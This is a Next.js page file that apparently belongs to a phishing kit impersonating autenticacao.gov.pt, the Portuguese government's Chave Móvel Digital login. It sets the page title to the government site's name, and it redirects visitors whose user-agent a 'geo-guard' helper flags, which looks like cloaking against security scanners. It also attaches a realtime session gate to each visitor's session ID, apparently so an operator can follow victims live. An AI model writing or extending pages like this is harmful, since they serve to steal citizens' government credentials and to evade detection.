import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { AutenticacaoClient } from "./autenticacao-client";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return {
    title: "autenticacao.gov.pt",
    description: "Autenticação com Chave Móvel Digital",
  };
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function AutenticacaoPage({ searchParams }: Props) {
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);

  const params = await searchParams;
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <AutenticacaoClient sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
